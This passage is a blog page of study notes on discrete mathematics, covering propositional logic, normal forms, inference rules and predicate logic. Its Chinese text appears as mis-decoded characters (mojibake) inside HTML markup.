id="å‘½é¢˜å…¬å¼"><a href="#å‘½é¢˜å…¬å¼" class="headerlink" title="å‘½é¢˜å…¬å¼"></a>å‘½é¢˜å…¬å¼</h6><p>åŸå­å‘½é¢˜åˆè¢«ç§°ä½œ<strong>å‘½é¢˜å¸¸é‡</strong>æˆ–<strong>å¸¸å€¼å‘½é¢˜</strong>ï¼Œè€Œå…¶ä»–P,Q,Rç­‰é€šå¸¸(çœŸå€¼å¯å˜)è¢«ç§°ä¸º<strong>å‘½é¢˜å˜é‡</strong>æˆ–<strong>å‘½é¢˜å˜å…ƒ</strong>ã€‚å‘½é¢˜å…¬å¼è¯¸å¦‚<code>Â¬ (ï¼°âˆ§ï¼±)â†’Â¬ ï¼²</code> åˆè¢«ç§°ä¸º P, Q å’ŒRçš„çœŸå€¼å‡½æ•°ã€‚å¸¸è¢«è®°ä¸ºï¼§(ï¼°,ï¼±,ï¼²)</p><h6 id="å‘½é¢˜å…¬å¼çš„è§£é‡Šä¸çœŸå€¼è¡¨"><a href="#å‘½é¢˜å…¬å¼çš„è§£é‡Šä¸çœŸå€¼è¡¨" class="headerlink" title="å‘½é¢˜å…¬å¼çš„è§£é‡Šä¸çœŸå€¼è¡¨"></a>å‘½é¢˜å…¬å¼çš„è§£é‡Šä¸çœŸå€¼è¡¨</h6><p>æˆ‘ä»¬è¿›è¡Œå¦‚ä¸‹å®šä¹‰ï¼š</p><ul><li>å…¬å¼Gçš„çœŸå€¼å…¨ä¸ºâ€™çœŸâ€™ï¼Œåˆ™ç§°å…¬å¼Gä¸º<strong>æ°¸çœŸå…¬å¼(é‡è¨€å¼)</strong></li><li>å…¬å¼Gçš„çœŸå€¼å…¨ä¸ºâ€™å‡â€™ï¼Œåˆ™ç§°å…¬å¼Gä¸º<strong>æ°¸å‡å…¬å¼(çŸ›ç›¾å¼)</strong></li><li>å…¬å¼Gçš„çœŸå€¼è‡³å°‘å­˜åœ¨ä¸€ä¸ªä¸ºâ€™çœŸâ€™ï¼Œåˆ™ç§°å…¬å¼Gä¸º<strong>å¯æ»¡è¶³å…¬å¼</strong></li></ul><p>å¦‚æœé¢˜ç›®è¦æ±‚_åˆ¤æ–­å…¬å¼çš„ç±»å‹_ï¼Œå°±æ˜¯è®©æˆ‘ä»¬åŒ–ç®€ï¼Œçœ‹å…¬å¼æ˜¯é‡è¨€å¼è¿˜æ˜¯çŸ›ç›¾å¼è¿˜æ˜¯å¯æ»¡è¶³å…¬å¼Â·Â·Â·</p><h6 id="å‘½é¢˜å…¬å¼çš„åŸºæœ¬ç­‰ä»·å®šå¾‹"><a href="#å‘½é¢˜å…¬å¼çš„åŸºæœ¬ç­‰ä»·å®šå¾‹" class="headerlink" title="å‘½é¢˜å…¬å¼çš„åŸºæœ¬ç­‰ä»·å®šå¾‹"></a>å‘½é¢˜å…¬å¼çš„åŸºæœ¬ç­‰ä»·å®šå¾‹</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230511181436055.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230511181447825.png"></p><hr><h5 id="èŒƒå¼"><a href="#èŒƒå¼" class="headerlink" title="èŒƒå¼"></a>èŒƒå¼</h5><p>å¯¹äºä»»æ„çš„å‘½é¢˜å…¬å¼ï¼Œæ˜¯å¦æœ‰ä¸€ä¸ªå”¯ä¸€çš„ï¼Œæ ‡å‡†çš„è¡¨ç¤ºå½¢å¼å‘¢ï¼Ÿè¿™å°±æ˜¯èŒƒå¼è¦è§£å†³çš„é—®é¢˜ã€‚</p><h6 id="è”ç»“è¯çš„å®Œå¤‡é›†"><a href="#è”ç»“è¯çš„å®Œå¤‡é›†" class="headerlink" title="è”ç»“è¯çš„å®Œå¤‡é›†"></a>è”ç»“è¯çš„å®Œå¤‡é›†</h6><p>æ‹¬å·ç»„æˆçš„æœ‰é™é•¿åº¦çš„ç¬¦å·ä¸²ï¼Œ åˆå¯ä»¥çŸ¥é“â€œâ†’â€å’Œâ€œâ†”â€å¯ç”¨â€œÂ¬ â€ â€œâˆ§â€å’Œâ€œâˆ¨â€ç­‰ä»·è¡¨ç¤ºã€‚å› æ­¤ï¼Œå¯ä»¥ è¯´ä»»ä½•å‘½é¢˜å…¬å¼éƒ½å¯ä»¥ç”±â€œÂ¬ â€â€œâˆ§â€å’Œâ€œâˆ¨â€è¿™ ï¼“ ä¸ªè”ç»“è¯æ¥ç­‰ä»·è¡¨ç¤ºã€‚ç§°è¿™ ï¼“ ä¸ªè”ç»“è¯æ„æˆçš„é›†åˆ{Â¬ ï¼Œ âˆ§ï¼Œ âˆ¨}ä¸º<strong>è”ç»“è¯çš„å®Œå¤‡é›†</strong>ã€‚</p><p>ç»™å‡ºå®šä¹‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Â è®¾S,Tæ˜¯ä»»æ„è”ç»“è¯é›†åˆã€‚</span><br><span class="line">Â (1)å¦‚æœä»»æ„ä¸€ä¸ªå‘½é¢˜å…¬å¼éƒ½å¯ä»¥ç”¨Sä¸­çš„è”ç»“è¯è¿›è¡Œç­‰ä»·è¡¨ç¤ºï¼Œåˆ™ç§°Sæ˜¯è”ç»“è¯çš„å®Œå¤‡é›†</span><br><span class="line">Â (2)è®¾Sæ˜¯ä¸€ä¸ªè”ç»“è¯çš„å®Œå¤‡é›†ä¸” ï¼´âŠ‚ï¼³ã€‚å¦‚æœè‡³å°‘å­˜åœ¨ä¸€ä¸ªå‘½é¢˜å…¬å¼ä¸èƒ½ç”¨Tä¸­çš„è”ç»“è¯è¿›è¡Œç­‰ä»·è¡¨ç¤ºï¼Œåˆ™ç§°Sä¸º#æå°è”ç»“è¯çš„å®Œå¤‡é›†#</span><br><span class="line">Â  Â  Â è¡¥ï¼šæå°è”ç»“è¯çš„å®Œå¤‡é›†è¿˜æœ‰&#123;Â¬ ï¼Œâˆ¨&#125;</span><br></pre></td></tr></table></figure><h6 id="æå–èŒƒå¼å’Œå’Œå–èŒƒå¼"><a href="#æå–èŒƒå¼å’Œå’Œå–èŒƒå¼" class="headerlink" title="æå–èŒƒå¼å’Œå’Œå–èŒƒå¼"></a>æå–èŒƒå¼å’Œå’Œå–èŒƒå¼</h6><p>ç†è®ºä¸Šï¼Œé€‰ç”¨ä¸åŒçš„è”ç»“å®Œå¤‡è¯å¯ä»¥æ›´åŠ æ–¹ä¾¿çš„å¯¹å‘½é¢˜å…¬å¼è¿›è¡Œç ”ç©¶ã€‚ä½†æ˜¯åŒä¸€ä¸ªå‘½é¢˜å…¬å¼ç”¨ä¸åŒçš„è”ç»“å®Œå¤‡è¯å°±ä¼šå¾—åˆ°ä¸åŒçš„è¡¨è¾¾å¼ï¼Œè¿™ç»™ç ”ç©¶å¸¦æ¥äº†ä¸ä¾¿ã€‚</p><p>æˆ‘ä»¬ç€é‡ç ”ç©¶ç”¨è”ç»“å®Œå¤‡è¯ï¼š{Â¬ ï¼Œ âˆ§ï¼Œ âˆ¨}è¡¨ç¤ºçš„å‘½é¢˜å…¬å¼çš„æ ‡å‡†å½¢å¼â€”â€”<strong>èŒƒå¼</strong>ã€‚</p><p>ä¸‹é¢å…ˆå°†ä¸€äº›æ¦‚å¿µï¼š</p><ul><li><strong>æ–‡å­—</strong>ï¼šç§°å‘½é¢˜å˜å…ƒæˆ–è€…å‘½é¢˜å˜å…ƒçš„å¦å®šä¸ºæ–‡å­—</li><li><strong>åˆå–å¼æˆ–çŸ­è¯­</strong>ï¼šå¦‚æœä¸€ä¸ªå‘½é¢˜å…·æœ‰å½¢å¼å¼ ï¼¡ï¼‘âˆ§ï¼¡ï¼’âˆ§â€¦âˆ§ï¼¡ï½(ï½â‰¥ï¼‘)ã€‚å…¶ä¸­ ï¼¡ï½‰(ï½‰ ï¼ ï¼‘ï¼Œ ï¼’ï¼Œâ€¦ï¼Œï½)æ˜¯æ–‡å­—ï¼Œ åˆ™ç§°è¯¥å‘½é¢˜å…¬å¼ä¸ºåˆå–å¼æˆ–çŸ­è¯­ã€‚</li><li><strong>æå–å¼æˆ–å­—å¥</strong>ï¼šå¦‚æœä¸€ä¸ªå‘½é¢˜å…¬å¼å…·æœ‰å½¢å¼ ï¼¡ï¼‘âˆ¨ï¼¡ï¼’âˆ¨â€¦âˆ¨ï¼¡ï½(ï½â‰¥ï¼‘)ã€‚å…¶ä¸­ ï¼¡ï½‰(ï½‰ ï¼ ï¼‘ï¼Œ ï¼’ï¼Œâ€¦ï¼Œï½)æ˜¯æ–‡å­—ï¼Œ åˆ™ç§°è¯¥å‘½é¢˜å…¬å¼ä¸ºæå–å¼æˆ–å­—å¥ã€‚</li><li><strong>åˆå–èŒƒå¼</strong>ï¼šå¦‚æœä¸€ä¸ªå‘½é¢˜å…·æœ‰å½¢å¼å¼ ï¼¡ï¼‘âˆ§ï¼¡ï¼’âˆ§â€¦âˆ§ï¼¡ï½(ï½â‰¥ï¼‘)ã€‚å…¶ä¸­ ï¼¡ï½‰(ï½‰ ï¼ ï¼‘ï¼Œ ï¼’ï¼Œâ€¦ï¼Œï½)æ˜¯æå–å¼ï¼Œ åˆ™ç§°è¯¥å‘½é¢˜å…¬å¼ä¸ºåˆå–èŒƒå¼ã€‚</li><li><strong>æå–èŒƒå¼</strong>ï¼šå¦‚æœä¸€ä¸ªå‘½é¢˜å…¬å¼å…·æœ‰å½¢å¼ ï¼¡ï¼‘âˆ¨ï¼¡ï¼’âˆ¨â€¦âˆ¨ï¼¡ï½(ï½â‰¥ï¼‘)ã€‚å…¶ä¸­ ï¼¡ï½‰(ï½‰ ï¼ ï¼‘ï¼Œ ï¼’ï¼Œâ€¦ï¼Œï½)æ˜¯åˆå–å¼ï¼Œ åˆ™ç§°è¯¥å‘½é¢˜å…¬å¼ä¸ºæå–èŒƒå¼ã€‚</li></ul><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230515110347794.png"></p><p>è®¡ç®—åˆå–èŒƒå¼ï¼Œæå–èŒƒå¼ï¼š</p><ul><li>ç”¨â€œÂ¬ â€â€œâˆ§â€å’Œâ€œâˆ¨â€ç­‰ä»·æ›¿æ¢æ‰â€œâ†’â€å’Œâ€œâ†”â€</li><li>åˆ©ç”¨åŒé‡å¦å®šå¾‹æ¶ˆå»å¤šä½™çš„å¦å®šè”ç»“è¯ï¼Œå¾·æ‘©æ ¹å¾‹å°†å¦å®šè”ç»“è¯å†…ç§»</li><li>åˆ©ç”¨åˆ†é…ç‡ï¼Œç»“åˆå¾‹ï¼Œå¹‚ç­‰å¾‹ç­‰æ•´ç†å¾—åˆ°å¯¹åº”çš„æå–èŒƒå¼å’Œåˆå–èŒƒå¼</li></ul><p>æœ‰ä¸€ä¸ªå°æŠ€å·§ï¼šå¾—åˆ°æå–èŒƒå¼åå¯ä»¥ç›´æ¥è½¬æ¢å¾—åˆ°åˆå–èŒƒå¼  </p><p>Â  Â  Â  Â  (Â¬ï¼°âˆ§Â¬ï¼±)âˆ¨(ï¼°âˆ§ï¼±)âˆ¨ï¼²<br>Â  Â  Â  Â  Â  Â  Â  Â  Â <br>Â  (Â¬ ï¼°âˆ¨ï¼°âˆ¨ï¼²)âˆ§(Â¬ ï¼°âˆ¨ï¼±âˆ¨ï¼²)âˆ§(Â¬ ï¼±âˆ¨ï¼°âˆ¨ï¼²)âˆ§(Â¬ ï¼±âˆ¨ï¼±âˆ¨ï¼²)</p><h6 id="ä¸»åˆå–èŒƒå¼å’Œä¸»æå–èŒƒå¼"><a href="#ä¸»åˆå–èŒƒå¼å’Œä¸»æå–èŒƒå¼" class="headerlink" title="ä¸»åˆå–èŒƒå¼å’Œä¸»æå–èŒƒå¼"></a>ä¸»åˆå–èŒƒå¼å’Œä¸»æå–èŒƒå¼</h6><p><strong>æå¤§é¡¹å’Œæå°é¡¹</strong></p><p>å®šä¹‰ï¼šåœ¨å«æœ‰nä¸ªå‘½é¢˜å˜å…ƒçš„åˆ&#x2F;æå–å¼ä¸­ï¼Œå¦‚æœæ¯ä¸ªå‘½é¢˜å˜å…ƒä¸å…¶å¦å®šä¸åŒæ—¶å­˜åœ¨ï¼Œä½†äºŒè€…ä¹‹ä¸€æ°å¥½å‡ºç°ä¸”ä»…å‡ºç°ä¸€æ¬¡ï¼Œåˆ™ç§°è¿™ä¸ªåˆ&#x2F;æå–å¼ä¸ºå…³äºè¿™nä¸ªå‘½é¢˜å˜å…ƒçš„ä¸€ä¸ªæå¤§&#x2F;å°é¡¹ã€‚</p><p>Â æå¤§é¡¹ Â  Â -&gt; Â  Â  æå–å¼<br>Â æå°é¡¹ Â  Â -&gt; Â  Â  åˆå–å¼</p><p><strong>ç¼–ç è§„åˆ™</strong></p><p>æå¤§é¡¹çš„ç¼–ç è§„åˆ™ï¼šå‘½é¢˜å˜å…ƒæå…¶å¦å®šå¯¹åº” 0å’Œ 1</p><p>æå°é¡¹çš„ç¼–ç è§„åˆ™ï¼šå‘½é¢˜å˜å…ƒæå…¶å¦å®šå¯¹åº” 1 å’Œ 0</p><p><strong>ä¸»åˆå–èŒƒå¼å’Œä¸»æå–èŒƒå¼</strong></p><ul><li><strong>ä¸»åˆå–èŒƒå¼</strong>ï¼šä¸€ä¸ªå‘½é¢˜å…¬å¼å…·æœ‰å½¢å¼ï¼šï¼¡1âˆ§ï¼¡2âˆ§â€¦âˆ§ï¼¡n(ï½â‰¥ï¼‘)ï¼Œå…¶ä¸­Aiæ˜¯æå¤§é¡¹ï¼Œåˆ™ç§°æ”¹å‘½é¢˜å…¬å¼ä¸ºä¸»åˆå–èŒƒå¼</li><li><strong>ä¸»æå–èŒƒå¼</strong>ï¼šä¸€ä¸ªå‘½é¢˜å…¬å¼å…·æœ‰å½¢å¼ï¼šï¼¡1âˆ¨ï¼¡2âˆ¨â€¦âˆ¨ï¼¡3(ï½â‰¥ï¼‘)ï¼Œå…¶ä¸­Aiæ˜¯æå°é¡¹ï¼Œåˆ™ç§°è¯¥å‘½é¢˜å…¬å¼ä¸ºä¸»æå–èŒƒå¼ã€‚</li></ul><p>ä¸»åˆ&#x2F;æå–èŒƒå¼çš„è®¡ç®—æ–¹æ³•</p><ul><li>å…ˆè®¡ç®—å‡ºåˆå–èŒƒå¼æˆ–æå–èŒƒå¼</li><li>å°†æå–&#x2F;åˆå–èŒƒå¼ä¸­çš„æ¯ä¸€ä¸ªå¼å­å˜æˆæå¤§é¡¹&#x2F;æå°é¡¹</li><li><strong>å°æŠ€å·§ï¼šï¼°ï¼ï¼°âˆ§ï¼‘ï¼ï¼°âˆ§(Â¬ ï¼±âˆ¨ï¼±)ï¼›ï¼°ï¼ï¼°âˆ¨ï¼ï¼ï¼°âˆ¨(Â¬ ï¼±âˆ§ï¼±)</strong></li><li>åˆ©ç”¨å¹‚ç­‰å¾‹å°†ç›¸åŒçš„æå¤§&#x2F;æå°é¡¹åˆå¹¶ï¼ŒåŒæ—¶åˆ©ç”¨äº¤æ¢å¾‹è¿›è¡Œé¡ºåºè°ƒæ•´ï¼Œä»è€Œå¾—åˆ°ä¸»&#x2F;åˆå–èŒƒå¼ã€‚</li></ul><hr><h5 id="å‘½é¢˜é€»è¾‘çš„æ¨ç†ç†è®º"><a href="#å‘½é¢˜é€»è¾‘çš„æ¨ç†ç†è®º" class="headerlink" title="å‘½é¢˜é€»è¾‘çš„æ¨ç†ç†è®º"></a>å‘½é¢˜é€»è¾‘çš„æ¨ç†ç†è®º</h5><h6 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h6><p><strong>å®šä¹‰</strong>ï¼šè®¾ ï¼§ï¼‘ï¼Œï¼§ï¼’ï¼ŒÂ·Â·Â·ï¼Œï¼§ï½ ï¼Œ ï¼¨ æ˜¯å‘½é¢˜å…¬å¼ã€‚å¯¹ä»»æ„è§£é‡Š Iï¼Œå¦‚æœ ï¼§ï¼‘âˆ§ï¼§ï¼’âˆ§Â·Â·Â·âˆ§ï¼§ï½ä¸ºçœŸï¼Œ ï¼¨ ä¹Ÿä¸ºçœŸã€‚æˆ–è€… ï¼§ï¼‘âˆ§ï¼§ï¼’âˆ§ï¼Œâˆ§ï¼§ï½ä¸º å‡ï¼Œ åˆ™ç§° ï¼¨ æ˜¯ ï¼§ï¼‘ ï¼Œï¼§ï¼’ ï¼ŒÂ·Â·Â·ï¼Œï¼§ï½çš„é€»è¾‘ç»“æœ(Logic Conclution)ã€‚ æˆ–è€… ï¼§ï¼‘ ï¼Œï¼§ï¼’ ï¼ŒÂ·Â·Â·ï¼Œï¼§ï½å…±åŒè•´æ¶µ ï¼¨ã€‚ è®°ä¸º ï¼§ï¼‘ ï¼Œï¼§ï¼’ ï¼ŒÂ·Â·Â·ï¼Œï¼§ï½â‡’ï¼¨ã€‚</p><p><strong>å®šç†2.6</strong>ï¼š å…¬å¼ ï¼¨ æ˜¯å‰æé›†åˆ{ï¼§ï¼‘ï¼Œï¼§ï¼’ï¼ŒÂ·Â·Â·ï¼Œï¼§ï½ }çš„é€»è¾‘ç»“æœå½“ä¸”ä»…å½“ ï¼§ï¼‘âˆ§ï¼§ï¼’âˆ§Â·Â·Â·âˆ§ï¼§ï½â†’ï¼¨ ä¸ºæ°¸çœŸå…¬å¼ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230607184151184-1024x240.png"></p><h6 id="åˆ¤åˆ«æ–¹æ³•"><a href="#åˆ¤åˆ«æ–¹æ³•" class="headerlink" title="åˆ¤åˆ«æ–¹æ³•"></a>åˆ¤åˆ«æ–¹æ³•</h6><p><strong>çœŸå€¼è¡¨æŠ€æœ¯</strong>ï¼šæ„é€ çœŸå€¼è¡¨ï¼Œé…åˆå®šç†2.6å»åˆ¤æ–­ (<strong>â†’</strong>)</p><p><strong>ç­‰ä»·å…¬å¼è½¬æ¢æ³•</strong>ï¼š</p><ul><li>åˆå–æ‰€æœ‰å‰æä½œä¸ºè•´å«å¼çš„å‰ä»¶ï¼Œç»“è®ºä½œä¸ºè•´å«å¼çš„åä»¶</li><li>åŒ–ç®€è¿™ä¸ªè•´å«å¼</li><li>å¦‚æœåŒ–ç®€ç»“æœä¸º1ï¼Œåˆ™æ¨ç†æœ‰æ•ˆï¼Œå¦åˆ™æ¨ç†æ— æ•ˆã€‚</li></ul><p><strong>æ¼”ç»æ³•</strong>ï¼šä»å‰æ(å‡è®¾)å‡ºå‘ï¼Œä¾æ®å…¬è®¤çš„æ¨ç†è§„åˆ™å’Œæ¨ç†å®šå¾‹å¯¼å‡ºç»“è®ºçš„æ–¹æ³•ã€‚</p><blockquote><p>ä¸ºäº†æ­£ç¡®åœ°ä½¿ç”¨æ¼”ç»æ³•å»åˆ¤å®šæ¨ç†çš„æœ‰æ•ˆæ€§ï¼Œè¿˜éœ€è¦äº†è§£<strong>æ¨ç†å®šå¾‹</strong>å’Œ<strong>æ¨ç†è§„åˆ™</strong></p></blockquote><p>_æ¨ç†å®šå¾‹_ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230607185138322-1024x411.png"></p><p>_æ¨ç†è§„åˆ™_ï¼š</p><p>ï¼ˆ1ï¼‰<strong>Pè§„åˆ™</strong>(Premiseå‰æå¼•ç”¨è§„åˆ™) åœ¨æ¨ç†è¿‡ç¨‹ä¸­ï¼Œå¦‚æœå¼•å…¥å‰æé›†åˆä¸­çš„ä¸€ä¸ª å‰æï¼Œ åˆ™ç§°ä½¿ç”¨äº†Pè§„åˆ™</p><p>ï¼ˆ2ï¼‰<strong>T è§„åˆ™</strong>(Transformationï¼Œ é€»è¾‘ç»“æœå¼•ç”¨è§„åˆ™) åœ¨æ¨ç†è¿‡ç¨‹ä¸­ï¼Œå¦‚æœå¼•å…¥æ¨ç†è¿‡ç¨‹ä¸­äº§ç”Ÿçš„æŸä¸ªä¸­é—´ç»“æœï¼Œåˆ™ç§°ä½¿ç”¨äº†Tè§„åˆ™ã€‚</p><p>ï¼ˆ3ï¼‰)<strong>CPè§„åˆ™</strong>(Conclusion premiseï¼Œé™„åŠ å‰æè§„åˆ™) åœ¨æ¨ç†è¿‡ç¨‹ä¸­ï¼Œå¦‚æœé€»è¾‘ç»“æœä¸ºè•´æ¶µå¼ï¼Œ å¹¶ä¸”å°†è¯¥è•´æ¶µå¼çš„å‰ä»¶ä½œä¸ºå‰æå¼•å…¥ï¼Œåˆ™ç§°ä½¿ç”¨äº†CPè§„åˆ™ã€‚</p><p>è¿˜æœ‰ä¸€ä¸ªæ¶ˆè§£åŸç†ï¼Œä¸å¤ªä¼šï¼Œæœ‰äººè¯´ä¸æ€ä¹ˆè¦æ±‚ï¼Œå°±ä¸æ•´ç†äº†ã€‚ã€‚</p><blockquote><p>äº‹å®ä¸Šï¼Œæ¶ˆè§£åŸç†å°±æ˜¯åè¯æ³•çš„ä¸€ç§å½¢å¼</p></blockquote><p>â‘  ï¼°âˆ¨Â¬ ï¼² ï¼°</p><p>â‘¡ ï¼² ï¼°</p><p>â‘¢ ï¼° ï¼´ï¼Œ â‘ ï¼Œ â‘¡ï¼Œ <strong>æ¶ˆè§£åŸç†</strong></p><hr><h5 id="å‘½é¢˜é€»è¾‘çš„åº”ç”¨"><a href="#å‘½é¢˜é€»è¾‘çš„åº”ç”¨" class="headerlink" title="å‘½é¢˜é€»è¾‘çš„åº”ç”¨"></a>å‘½é¢˜é€»è¾‘çš„åº”ç”¨</h5><h6 id="å‘½é¢˜è”ç»“è¯çš„åº”ç”¨"><a href="#å‘½é¢˜è”ç»“è¯çš„åº”ç”¨" class="headerlink" title="å‘½é¢˜è”ç»“è¯çš„åº”ç”¨"></a>å‘½é¢˜è”ç»“è¯çš„åº”ç”¨</h6><p><strong>è®¡ç®—æœºä¸­çš„æ¯”ç‰¹è¿ç®—</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230614000615736-1024x109.png"></p><p>éœ€è¦æ³¨æ„çš„å°±æ˜¯XORæŒ‡çš„æ˜¯å¼‚æˆ–(ä¸å¯å…¼æˆ–)ã€‚</p><p><strong>webæœç´¢</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230607214719154.png"></p><h6 id="å‘½é¢˜å…¬å¼çš„åº”ç”¨"><a href="#å‘½é¢˜å…¬å¼çš„åº”ç”¨" class="headerlink" title="å‘½é¢˜å…¬å¼çš„åº”ç”¨"></a>å‘½é¢˜å…¬å¼çš„åº”ç”¨</h6><p>åŒ–ç®€ç”µè·¯ï¼ŒåŒ–ç®€ç¨‹åºå›¾</p><p>e.g:</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230607214930918.png"></p><p>ç”¨å‘½é¢˜å…¬å¼åŒ–ç®€å…¶å¯¹åº”çš„ç”µè·¯ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230607214941287.png"></p><hr><h2 id="ç¬¬ä¸‰ç« -è°“è¯é€»è¾‘"><a href="#ç¬¬ä¸‰ç« -è°“è¯é€»è¾‘" class="headerlink" title="ç¬¬ä¸‰ç« _è°“è¯é€»è¾‘"></a>ç¬¬ä¸‰ç« _è°“è¯é€»è¾‘</h2><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230607215109808-1024x604.png"></p><hr><h5 id="è‡ªç„¶è¯­è¨€çš„è°“è¯ç¬¦å·åŒ–"><a href="#è‡ªç„¶è¯­è¨€çš„è°“è¯ç¬¦å·åŒ–" class="headerlink" title="è‡ªç„¶è¯­è¨€çš„è°“è¯ç¬¦å·åŒ–"></a>è‡ªç„¶è¯­è¨€çš„è°“è¯ç¬¦å·åŒ–</h5><h6 id="è°“è¯"><a href="#è°“è¯" class="headerlink" title="è°“è¯"></a>è°“è¯</h6><p>åœ¨åŸå­å‘½é¢˜ä¸­ï¼Œå¯ä»¥ç‹¬ç«‹å­˜åœ¨çš„å®¢ä½“(å¥å­ä¸­çš„ä¸»è¯­ã€ å®¾è¯­ç­‰)ç§°ä¸º<strong>ä¸ªä½“è¯</strong>(Individual)ã€‚ ç”¨ä»¥åˆ»ç”»å®¢ä½“æ€§è´¨æˆ–å®¢ä½“ä¹‹é—´å…³ç³»çš„éƒ¨åˆ†ç§°ä¸º<strong>è°“è¯</strong>(Predicate)ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230607215920531-1024x221.png"></p><p><strong>å®šä¹‰</strong>ï¼šè®¾ ï¼°(X1ï¼ŒX2 ï¼ŒÂ·Â·Â·ï¼ŒXn )æ˜¯å®šä¹‰åœ¨ ï¼¤ï½ä¸Šçš„ï½å…ƒå‡½æ•°ã€‚å…¶ä¸­ï¼¤ä¸ºéç©ºçš„ä¸ªä½“åŸŸï¼Œå¦‚æœï¼°(X1ï¼ŒX2 ï¼ŒÂ·Â·Â·ï¼ŒXn )çš„å€¼åŸŸæ˜¯{0,1}ã€‚åˆ™ç§°ï¼°(X1ï¼ŒX2 ï¼ŒÂ·Â·Â·ï¼ŒXn )ä¸ºnå…ƒå‘½é¢˜å‡½æ•°æˆ–nå…ƒè°“è¯ (Propositional Functionï¼‰ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230607220640742-1024x144.png"></p><h6 id="é‡è¯"><a href="#é‡è¯" class="headerlink" title="é‡è¯"></a>é‡è¯</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230614000640593-1024x155.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230607221527437-1024x217.png"></p><hr><h5 id="è°“è¯å…¬å¼å’Œè§£é‡Š"><a href="#è°“è¯å…¬å¼å’Œè§£é‡Š" class="headerlink" title="è°“è¯å…¬å¼å’Œè§£é‡Š"></a>è°“è¯å…¬å¼å’Œè§£é‡Š</h5><h6 id="è‡ªç”±å˜å…ƒå’Œçº¦æŸå˜å…ƒ"><a href="#è‡ªç”±å˜å…ƒå’Œçº¦æŸå˜å…ƒ" class="headerlink" title="è‡ªç”±å˜å…ƒå’Œçº¦æŸå˜å…ƒ"></a>è‡ªç”±å˜å…ƒå’Œçº¦æŸå˜å…ƒ</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230614000705497-1024x93.png"></p><h6 id="è°“è¯å…¬å¼çš„è§£é‡Š"><a href="#è°“è¯å…¬å¼çš„è§£é‡Š" class="headerlink" title="è°“è¯å…¬å¼çš„è§£é‡Š"></a>è°“è¯å…¬å¼çš„è§£é‡Š</h6><p>åœ¨ä»»æ„ç»™å®šçš„è§£é‡ŠIä¸‹ï¼Œå¦‚æœè°“è¯å…¬å¼Gçš„å–å€¼å…¨éƒ¨ä¸ºçœŸï¼Œåˆ™ç§°Gä¸º<strong>æ°¸çœŸå…¬å¼</strong>ï¼Œå¦‚æœå…¨éƒ¨ä¸ºå‡åˆ™ä¸º<strong>æ°¸å‡å…¬å¼</strong>ã€‚å¦‚æœå­˜åœ¨æœ‰çœŸï¼Œå°±æ˜¯<strong>å¯æ»¡è¶³å…¬å¼</strong>ã€‚</p><hr><h5 id="è°“è¯å…¬å¼çš„æ ‡å‡†å‹â€”â€”å‰æŸèŒƒå¼"><a href="#è°“è¯å…¬å¼çš„æ ‡å‡†å‹â€”â€”å‰æŸèŒƒå¼" class="headerlink" title="è°“è¯å…¬å¼çš„æ ‡å‡†å‹â€”â€”å‰æŸèŒƒå¼"></a>è°“è¯å…¬å¼çš„æ ‡å‡†å‹â€”â€”å‰æŸèŒƒå¼</h5><p>è®¾G,Hæ˜¯è°“è¯å…¬å¼ï¼Œå¦‚æœè°“è¯å…¬å¼G&lt;-&gt;Hæ˜¯æ°¸çœŸå…¬å¼ï¼Œé‚£ä¹ˆç§°G,Hæ˜¯ç­‰ä»·çš„ï¼Œè®°ä½œG&#x3D;H</p><hr><h5 id="è°“è¯é€»è¾‘çš„æ¨ç†ç†è®º"><a href="#è°“è¯é€»è¾‘çš„æ¨ç†ç†è®º" class="headerlink" title="è°“è¯é€»è¾‘çš„æ¨ç†ç†è®º"></a>è°“è¯é€»è¾‘çš„æ¨ç†ç†è®º</h5><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230607235615560.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230607235642026.png"></p><hr><h5 id="è°“è¯å…¬å¼çš„æ ‡å‡†å‹â€”â€”å‰æŸèŒƒå¼-1"><a href="#è°“è¯å…¬å¼çš„æ ‡å‡†å‹â€”â€”å‰æŸèŒƒå¼-1" class="headerlink" title="è°“è¯å…¬å¼çš„æ ‡å‡†å‹â€”â€”å‰æŸèŒƒå¼"></a>è°“è¯å…¬å¼çš„æ ‡å‡†å‹â€”â€”å‰æŸèŒƒå¼</h5><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608000512066-1024x381.png"></p><p>å‰æŸèŒƒå¼å¹¶ä¸å”¯ä¸€</p><hr><h5 id="è°“è¯é€»è¾‘çš„åº”ç”¨"><a href="#è°“è¯é€»è¾‘çš„åº”ç”¨" class="headerlink" title="è°“è¯é€»è¾‘çš„åº”ç”¨"></a>è°“è¯é€»è¾‘çš„åº”ç”¨</h5><h6 id="æ¨ç†è§„åˆ™"><a href="#æ¨ç†è§„åˆ™" class="headerlink" 